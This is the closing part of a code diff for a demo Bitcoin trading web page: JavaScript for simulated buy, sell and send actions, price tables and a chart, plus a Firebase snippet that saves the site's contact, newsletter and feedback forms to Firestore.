+            if (volume > portfolio[0].balance) {
+                showNotification('Insufficient Bitcoin balance', 'error');
+                return;
+            }
+            
+            // Update balance and portfolio
+            currentUser.balance += totalValue;
+            portfolio[0].balance -= volume;
+            portfolio[0].value = portfolio[0].balance * price;
+            portfolio[1].balance = currentUser.balance;
+            
+            showNotification('Bitcoin sold successfully!', 'success');
+        } else if (actionType === 'send') {
+            const recipient = document.getElementById('recipientAddress').value;
+            const amount = parseFloat(document.getElementById('sendAmount').value);
+            const fee = parseFloat(document.getElementById('networkFee').value);
+            const total = amount + fee;
+            
+            if (!recipient) {
+                showNotification('Please enter recipient address', 'error');
+                return;
+            }
+            
+            if (total > portfolio[0].balance) {
+                showNotification('Insufficient Bitcoin balance', 'error');
+                return;
+            }
+            
+            // Update portfolio
+            portfolio[0].balance -= total;
+            const btcPrice = marketData.find(m => m.symbol === 'BTC/USD').price;
+            portfolio[0].value = portfolio[0].balance * btcPrice;
+            
+            showNotification('Bitcoin sent successfully!', 'success');
+        } else if (actionType === 'receive') {
+            showNotification('Bitcoin address generated successfully!', 'success');
+        }
+        
+        // Update users in localStorage
+        const userIndex = users.findIndex(u => u.id === currentUser.id);
+        if (userIndex !== -1) {
+            users[userIndex] = currentUser;
+            localStorage.setItem('bitcoinTradeUsers', JSON.stringify(users));
+            localStorage.setItem('bitcoinTradeCurrentUser', JSON.stringify(currentUser));
+        }
+        
+        updateUIForUser();
+        initializePortfolio();
+    });
+
+    // Functions
+    function updateUIForUser() {
+        if (currentUser) {
+            loginBtn.style.display = 'none';
+            registerBtn.style.display = 'none';
+            userMenu.style.display = 'flex';
+            userName.textContent = currentUser.name;
+            dashboardUserName.textContent = currentUser.name;
+            userAvatar.textContent = currentUser.name.split(' ').map(n => n[0]).join('');
+            profileAvatar.textContent = currentUser.name.split(' ').map(n => n[0]).join('');
+            document.getElementById('accountNumber').textContent = currentUser.accountNumber;
+            accountBalance.textContent = currentUser.balance.toFixed(2);
+            
+            if (currentUser.balance === 0) {
+                balanceChange.textContent = 'Add funds to start trading';
+                balanceChange.style.color = '#666';
+            } else {
+                balanceChange.textContent = 'Ready to trade';
+                balanceChange.style.color = 'var(--success)';
+            }
+        } else {
+            loginBtn.style.display = 'block';
+            registerBtn.style.display = 'block';
+            userMenu.style.display = 'none';
+        }
+    }
+
+    function initializeMarketData() {
+        marketDataTable.innerHTML = '';
+        marketData.forEach(item => {
+            const row = document.createElement('tr');
+            row.innerHTML = '<td>' + item.name + '</td>' +
+                '<td>$' + item.price.toFixed(2) + '</td>' +
+                '<td class="' + (item.change >= 0 ? 'price-up' : 'price-down') + '">' + (item.change >= 0 ? '+' : '') + '$' + Math.abs(item.change).toFixed(2) + '</td>' +
+                '<td class="' + (item.changePercent >= 0 ? 'price-up' : 'price-down') + '">' + (item.changePercent >= 0 ? '+' : '') + item.changePercent.toFixed(2) + '%</td>' +
+                '<td><button class="btn btn-outline btn-sm" data-symbol="' + item.symbol + '">Trade</button></td>';
+            marketDataTable.appendChild(row);
+        });
+
+        // Add event listeners to trade buttons
+        document.querySelectorAll('[data-symbol]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                if (!currentUser) {
+                    showNotification('Please login to trade', 'error');
+                    return;
+                }
+                
+                const symbol = btn.getAttribute('data-symbol');
+                instrumentSelect.value = symbol;
+                updateTradePrice();
+                
+                // Navigate to trading page
+                showPage('trading');
+            });
+        });
+    }
+
+    function initializeMarketsData() {
+        marketsDataTable.innerHTML = '';
+        marketData.forEach(item => {
+            const row = document.createElement('tr');
+            row.innerHTML = '<td>' + item.name + '</td>' +
+                '<td>' + item.symbol.split('/')[0] + '</td>' +
+                '<td>$' + item.price.toFixed(2) + '</td>' +
+                '<td class="' + (item.changePercent >= 0 ? 'price-up' : 'price-down') + '">' + (item.changePercent >= 0 ? '+' : '') + item.changePercent.toFixed(2) + '%</td>' +
+                '<td>$' + (item.marketCap / 1000000000).toFixed(2) + 'B</td>';
+            marketsDataTable.appendChild(row);
+        });
+    }
+
+    function initializePortfolio() {
+        portfolioData.innerHTML = '';
+        
+        // Update portfolio values with current prices
+        const btcPrice = marketData.find(m => m.symbol === 'BTC/USD').price;
+        portfolio[0].value = portfolio[0].balance * btcPrice;
+        portfolio[1].value = currentUser ? currentUser.balance : 0;
+        
+        portfolio.forEach(item => {
+            const row = document.createElement('tr');
+            row.innerHTML = '<td>' + item.symbol + '</td>' +
+                '<td>' + (item.symbol === 'BTC' ? item.balance.toFixed(8) : '$' + item.balance.toFixed(2)) + '</td>' +
+                '<td>$' + item.value.toFixed(2) + '</td>';
+            portfolioData.appendChild(row);
+        });
+    }
+
+    function initializeChart() {
+        const ctx = document.getElementById('priceChart').getContext('2d');
+        const chart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: ['9:00', '10:00', '11:00', '12:00', '13:00', '14:00', '15:00'],
+                datasets: [{
+                    label: 'Bitcoin (BTC)',
+                    data: [29150, 29220, 29350, 29420, 29580, 29450, 29458],
+                    borderColor: '#f2a900',
+                    backgroundColor: 'rgba(242, 169, 0, 0.1)',
+                    tension: 0.4,
+                    fill: true
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: {
+                    legend: {
+                        display: false
+                    }
+                },
+                scales: {
+                    y: {
+                        beginAtZero: false
+                    }
+                }
+            }
+        });
+    }
+
+    function updatePrices() {
+        // Simulate price changes
+        setInterval(() => {
+            marketData.forEach(item => {
+                const change = (Math.random() - 0.5) * 0.02 * item.price;
+                item.price += change;
+                item.change = change;
+                item.changePercent = (change / item.price) * 100;
+            });
+            
+            initializeMarketData();
+            initializeMarketsData();
+            if (currentUser) initializePortfolio();
+            updateTradePrice();
+        }, 5000);
+    }
+
+    function updateTradePrice() {
+        const selectedInstrument = instrumentSelect.value;
+        const instrument = marketData.find(m => m.symbol === selectedInstrument);
+        if (instrument) {
+            priceInput.value = instrument.price.toFixed(2);
+            calculateTotalCost();
+        }
+    }
+
+    // Fetch Bitcoin price from API (simulated)
+    function fetchBitcoinPrice() {
+        // In a real implementation, you would fetch from an API like CoinGecko or Binance
+        // For this demo, we'll simulate real-time updates
+        setInterval(() => {
+            const btcData = marketData.find(item => item.symbol === 'BTC/USD');
+            if (btcData) {
+                const price = btcData.price;
+                const change = btcData.change;
+                const changePercent = btcData.changePercent;
+                
+                btcPriceElement.textContent = '$' + price.toFixed(2);
+                btcChangeElement.textContent = (change >= 0 ? '+' : '') + '$' + Math.abs(change).toFixed(2) + ' (' + (changePercent >= 0 ? '+' : '') + changePercent.toFixed(2) + '%)';
+                btcChangeElement.className = 'price-change ' + (change >= 0 ? 'positive' : 'negative');
+                
+                btcPriceMarketsElement.textContent = '$' + price.toFixed(2);
+                btcChangeMarketsElement.textContent = (change >= 0 ? '+' : '') + '$' + Math.abs(change).toFixed(2) + ' (' + (changePercent >= 0 ? '+' : '') + changePercent.toFixed(2) + '%)';
+                btcChangeMarketsElement.className = 'price-change ' + (change >= 0 ? 'positive' : 'negative');
+            }
+        }, 2000);
+    }
+
+    function showNotification(message, type) {
+        // Create notification element
+        const notification = document.createElement('div');
+        notification.textContent = message;
+        notification.style.position = 'fixed';
+        notification.style.top = '20px';
+        notification.style.right = '20px';
+        notification.style.padding = '15px 20px';
+        notification.style.borderRadius = '4px';
+        notification.style.color = 'white';
+        notification.style.fontWeight = '600';
+        notification.style.zIndex = '1000';
+        notification.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
+        
+        if (type === 'success') {
+            notification.style.background = 'var(--success)';
+        } else {
+            notification.style.background = 'var(--danger)';
+        }
+        
+        document.body.appendChild(notification);
+        
+        // Remove notification after 3 seconds
+        setTimeout(() => {
+            document.body.removeChild(notification);
+        }, 3000);
+    }
+</script>
+<script type="module">  
+  // Import the functions you need from the SDKs you need  
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";  
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-analytics.js";  
+  // TODO: Add SDKs for Firebase products that you want to use  
+  // https://firebase.google.com/docs/web/setup#available-libraries  
+  
+  // Your web app's Firebase configuration  
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional  
+  const firebaseConfig = {  
+    apiKey: "AIzaSyBK95hPAwpCudGBkcZUkjwd1kffOUdNWdU",  
+    authDomain: "betaminer-ecf47.firebaseapp.com",  
+    projectId: "betaminer-ecf47",  
+    storageBucket: "betaminer-ecf47.firebasestorage.app",  
+    messagingSenderId: "107741347529",  
+    appId: "1:107741347529:web:e8932fcdca44576af7d718",  
+    measurementId: "G-SHF1E2R3X1"  
+  };  
+  
+  // Initialize Firebase  
+  const app = initializeApp(firebaseConfig);  
+  const analytics = getAnalytics(app);  
+
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";
+
+const db = getFirestore(app);
+
+async function saveFormData(formId, collectionName) {
+  const form = document.getElementById(formId);
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+
+    try {
+      await addDoc(collection(db, collectionName), data);
+      alert("Form submitted successfully!");
+      form.reset();
+    } catch (err) {
+      alert("Error saving form: " + err.message);
+    }
+  });
+}
+
+// Link your forms to Firestore
+  saveFormData("contactForm", "contact_messages");
+  saveFormData("newsletterForm", "newsletter_subscribers");
+  saveFormData("feedbackForm", "feedback_entries");
+</script>
+
+</script>
+</body>
+</html>
